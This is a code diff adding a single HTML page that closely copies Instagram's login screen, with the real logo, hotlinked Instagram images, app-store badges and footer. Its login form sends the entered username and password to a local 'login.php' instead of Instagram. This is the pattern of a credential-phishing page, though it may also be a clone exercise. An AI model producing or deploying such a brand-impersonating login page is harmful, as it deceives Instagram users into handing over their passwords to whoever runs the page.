@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
+        type="image/x-icon">
+    <style>
+        body {
+            background-color: white;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+
+        #main {
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+            align-items: center;
+            padding-bottom: 32px;
+        }
+
+        #left {
+            margin-top: 30px;
+        }
+
+        #image {
+            background-position: 0px 0px;
+            margin: auto;
+            width: 411px;
+            height: 600px;
+            background: url('https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png');
+        }
+
+        #image img {
+            margin: auto;
+            margin-top: 94px;
+            margin-left: 146px;
+            width: 251px;
+            height: 437px;
+        }
+
+        #right {
+            margin-top: 40px;
+            margin-left: 20px;
+            background-color: #faf9f9;
+
+
+        }
+
+        #first {
+            width: 350px;
+            height: 365px;
+            display: flex;
+            flex-direction: column;
+            border: 1px solid rgb(220, 220, 220);
+        }
+
+        #logo {
+            align-items: center;
+            justify-content: center;
+            margin: auto;
+            margin-bottom: 0%;
+        }
+
+        #logo img {
+            background-color: white;
+            width: 175px;
+            margin: auto;
+            margin-bottom: 0%;
+        }
+
+        #form {
+            margin: auto;
+            margin-top: 0%;
+            width: 348px;
+
+        }
+
+        #form form {
+            justify-content: center;
+            align-items: center;
+            display: flex;
+            flex-direction: column;
+        }
+
+        #email {
+            font-size: 12px;
+            width: 258px;
+            padding: 9px 0px 7px 8px;
+            margin: 4px;
+            border: 1px solid rgb(220, 220, 220);
+            border-radius: 2px;
+            background-color: #FAFAFA;
+        }
+
+        #pass {
+            font-size: 12px;
+            width: 258px;
+            padding: 9px 0px 7px 8px;
+            margin: 4px;
+            border: 1px solid rgb(220, 220, 220);
+            border-radius: 2px;
+            background-color: #FAFAFA;
+
+        }
+
+        #btn {
+            color: white;
+            font-weight: bold;
+            font-size: 12px;
+            width: 258px;
+            padding: 9px 0px 7px 8px;
+            margin-top: 8px;
+            margin-bottom: 0px;
+            border: 1px solid rgb(194, 194, 194);
+            border-radius: 5px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            background-color: #0095f6;
+
+        }
+
+        #or {
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+            align-items: center;
+            color: #797777;
+        }
+
+        .line {
+            /* margin-top: 7px; */
+            text-align: center;
+            justify-content: center;
+            align-items: center;
+            background-color: #b5b4b4;
+            width: 100px;
+            height: 1px;
+            flex-shrink: 1;
+        }
+
+        .or2 {
+            padding: 20px;
+            font-size: 13px;
+            font-weight: bolder;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+
+        #fblogin {
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #fblogo img {
+            margin-top: 6px;
+            margin-right: 10px;
+            width: 17px;
+
+        }
+
+        #fbtext {
+            color: #385185;
+            font-size: 14px;
+            font-weight: bold;
+
+        }
+
+        #forgot {
+            margin-top: 12px;
+            font-size: 12px;
+            color: #00376B;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        #second {
+            font-size: 14px;
+            padding-top: 20px;
+            padding-bottom: 20px;
+            width: 350px;
+            border: 1px solid rgb(220, 220, 220);
+            margin-top: 10px;
+            margin-bottom: 10px;
+            text-align: center
+        }
+
+        #sign {
+            color: #0095f6;
+            font-weight: bold;
+        }
+
+
+
+        #third {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #getapp {
+            font-size: 14px;
+            text-align: center;
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+
+        #app {
+
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+            align-items: center;
+
+        }
+
+        #app img {
+            width: 136px;
+            padding-left: 10px;
+        }
+
+        footer {
+            color: #8E8E8E;
+            font-size: 12px;
+        }
+
+        #other {}
+
+        #other ul {
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #other li {
+            list-style: none;
+            padding: 7px;
+        }
+
+        #other2 {
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #language {
+            padding-right: 25px;
+            cursor: pointer;
+        }
+
+        .lan {
+            color: #8E8E8E;
+            font-size: 12px;
+            cursor: pointer;
+            border: none;
+        }
+
+        select {
+            appearance: menulist;
+            box-sizing: border-box;
+        }
+
+        @media screen and (max-width:800px) {
+            #left {
+                display: none;
+            }
+
+        }
+
+        @media screen and (max-width:450px) {
+            #right {
+                top: 0%;
+                margin-top: 0%;
+                /* width: 450px; */
+            }
+
+            #first {
+                border: none;
+            }
+
+            #second {
+                border: none;
+            }
+
+        }
+    </style>
+</head>
+
+<body>
+    <div id="main">
+        <div id="left">
+            <div id="image">
+                <img src="https://www.instagram.com/static/images/homepage/screenshot2-2x.jpg/177140221987.jpg" alt="">
+            </div>
+        </div>
+
+        <div id="right">
+            <div id="first">
+
+                <div id="logo">
+                    <img src="https://1000logos.net/wp-content/uploads/2017/02/Instagram-Logo-640x400.png" alt="logo">
+                </div>
+                <div id="form">
+                    <form action="login.php">
+                        <input type="text" name="" id="email" placeholder="Phone number,username or email" required>
+                        <input type="password" name="" id="pass" placeholder="Password">
+                        <input type="submit" id="btn" value="Log In">
+                    </form>
+                </div>
+                <div id="or">
+                    <div class="line"></div>
+                    <div class="or2">OR</div>
+                    <div class="line"></div>
+                </div>
+                <div id="fblogin">
+                    <div id="fblogo">
+                        <img src="https://cdn.techgyd.com/50-Best-Facebook-Logo-Icons-GIF-Transparent-PNG-Images-9.png"
+                            alt="fbiocn">
+                    </div>
+                    <div id="fbtext">
+                        Log in with Facebook
+                    </div>
+                </div>
+                <div id="forgot">
+                    Forgot password?
+                </div>
+            </div>
+
+            <div id="second">
+                Don't have an account? <span id="sign">Sign up</span>
+            </div>
+
+            <div id="third">
+                <div id="getapp">
+                    Get the app
+                </div>
+                <div id="app">
+                    <img alt="Available on the App Store" class="Rt8TI "
+                        src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png">
+
+                    <img alt="Available on Google Play" class="Rt8TI "
+                        src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png">
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <footer>
+        <div id="other">
+            <ul>
+                <li>About</li>
+                <li>Blog</li>
+                <li>Jobs</li>
+                <li>Help</li>
+                <li>API</li>
+                <li>Privacy</li>
+                <li>Terms</li>
+                <li>Top Accounts</li>
+                <li>Hashtags</li>
+                <li>Locations</li>
+            </ul>
+        </div>
+        <div id="other2">
+            <div id="language">
+                <select aria-label="Switch Display Language" class="lan">
+                    <option value="af">Afrikaans</option>
+                    <option value="cs">Čeština</option>
+                    <option value="da">Dansk</option>
+                    <option value="de">Deutsch</option>
+                    <option value="el">Ελληνικά</option>
+                    <option value="en">English</option>
+                    <option value="en-gb">English (UK)</option>
+                    <option value="es">Español (España)</option>
+                    <option value="es-la">Español</option>
+                    <option value="fi">Suomi</option>
+                    <option value="fr">Français</option>
+                    <option value="id">Bahasa Indonesia</option>
+                    <option value="it">Italiano</option>
+                    <option value="ja">日本語</option>
+                    <option value="ko">한국어</option>
+                    <option value="ms">Bahasa Melayu</option>
+                    <option value="nb">Norsk</option>
+                    <option value="nl">Nederlands</option>
+                    <option value="pl">Polski</option>
+                    <option value="pt-br">Português (Brasil)</option>
+                    <option value="pt">Português (Portugal)</option>
+                    <option value="ru">Русский</option>
+                    <option value="sv">Svenska</option>
+                    <option value="th">ภาษาไทย</option>
+                    <option value="tl">Filipino</option>
+                    <option value="tr">Türkçe</option>
+                    <option value="zh-cn">中文(简体)</option>
+                    <option value="zh-tw">中文(台灣)</option>
+                    <option value="bn">বাংলা</option>
+                    <option value="gu">ગુજરાતી</option>
+                    <option value="hi">हिन्दी</option>
+                    <option value="hr">Hrvatski</option>
+                    <option value="hu">Magyar</option>
+                    <option value="kn">ಕನ್ನಡ</option>
+                    <option value="ml">മലയാളം</option>
+                    <option value="mr">मराठी</option>
+                    <option value="ne">नेपाली</option>
+                    <option value="pa">ਪੰਜਾਬੀ</option>
+                    <option value="si">සිංහල</option>
+                    <option value="sk">Slovenčina</option>
+                    <option value="ta">தமிழ்</option>
+                    <option value="te">తెలుగు</option>
+                    <option value="vi">Tiếng Việt</option>
+                    <option value="zh-hk">中文(香港)</option>
+                    <option value="bg">Български</option>
+                    <option value="fr-ca">Français (Canada)</option>
+                    <option value="ro">Română</option>
+                    <option value="sr">Српски</option>
+                    <option value="uk">Українська</option>
+                </select>
+            </div>
+            <div id="copy">
+                © 2021 Instagram from Facebook
+            </div>
+        </div>
+    </footer>
+
+</body>
+
+</html>
